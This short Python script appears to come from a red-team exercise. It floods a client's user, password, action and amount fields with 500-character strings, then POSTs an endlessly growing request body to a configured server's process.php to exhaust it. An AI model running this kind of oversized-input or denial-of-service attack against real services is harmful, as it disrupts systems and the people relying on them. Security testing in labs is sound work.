import io
import threading
import time

import requests

from red.config import config
from red.utils import client


a_length = 500
thats_what_she_said = io.StringIO()


def run():
    client.process(
        user="a" * a_length,
        password="a" * a_length,
        action="a" * a_length,
        amount="a" * a_length,
    )
    thats_what_she_said.write("GET ")
    stop = threading.Event()

    def keep_very_alive():
        while not stop.is_set():
            thats_what_she_said.write("a")

    k = threading.Thread(target=keep_very_alive)
    k.start()
    time.sleep(1)
    requests.post(f"http://{config.server_host}:{config.server_port}/process.php",
                  data=thats_what_she_said)
    try:
        k.join()
    except:
        stop.set()
    k.join()
    print()
